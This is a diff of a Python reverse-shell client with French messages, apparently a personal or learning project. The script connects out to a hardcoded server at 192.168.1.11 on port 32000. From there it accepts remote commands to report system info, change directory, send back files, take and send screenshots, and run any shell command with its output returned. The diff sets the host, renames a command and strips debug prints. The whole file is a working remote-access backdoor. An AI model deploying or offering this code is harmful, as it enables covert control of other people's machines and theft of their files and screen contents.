@@ -1,3 +1,4 @@
+
 import socket
 import time
 import subprocess
@@ -5,7 +6,7 @@ import platform
 import os
 from PIL import ImageGrab
 
-HOST_IP = "" # IP ou nom de domaine du serveur
+HOST_IP = "192.168.1.11"
 HOST_PORT = 32000
 MAX_DATA_SIZE = 1024
 
@@ -16,7 +17,7 @@ while True:
         s.connect((HOST_IP, HOST_PORT))
     except ConnectionRefusedError:
         print("ERREUR : impossible de se connecter au serveur. Reconnexion...")
-        time.sleep(4)
+        time.sleep(8)
     else:
         print("Connecté au serveur")
         break
@@ -27,11 +28,10 @@ while True:
     if not commande_data:
         break
     commande = commande_data.decode()
-    print("Commande : ", commande)
 
     commande_split = commande.split(" ")
 
-    if commande == "infos":
+    if commande == "system":
         reponse = platform.platform() + " " + os.getcwd()
         reponse = reponse.encode()
     elif len(commande_split) == 2 and commande_split[0] == "cd":
@@ -41,7 +41,6 @@ while True:
         except FileNotFoundError:
             reponse = "ERREUR : ce répertoire n'exite pas"
         reponse = reponse.encode()
-        
     elif len(commande_split) == 2 and commande_split[0] == "dl":
         try:
             f = open(commande_split[1], "rb")
@@ -50,18 +49,17 @@ while True:
         else:
             reponse = f.read()
             f.close()
-            
     elif len(commande_split) == 2 and commande_split[0] == "screen":
-        screenshot = ImageGrab.grab()
-        screen_name = commande_split[1] + ".png"
-        screenshot.save(screen_name, "PNG")
-        try:
-            f = open(commande_split[1], "rb")
-        except FileNotFoundError:
-            reponse = " ".encode()
-        else:
-            reponse = f.read()
-            f.close()        
+            capture_ecran = ImageGrab.grab()
+            capture_filename = commande_split[1] + ".png"
+            capture_ecran.save(capture_filename, "PNG")
+            try:
+                f = open(capture_filename, "rb")
+            except FileNotFoundError:
+                reponse = " ".encode()
+            else:
+                reponse = f.read()
+                f.close()
     else:
         resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
         reponse = resultat.stdout + resultat.stderr
@@ -69,14 +67,11 @@ while True:
             reponse = " "
         reponse = reponse.encode()
 
-    # reponse est déjà encodé
     data_len = len(reponse)
     header = str(data_len).zfill(13)
-    print("header:", header)
     s.sendall(header.encode())
     if data_len > 0:
         s.sendall(reponse)
     
-    # handshake
 
 s.close()
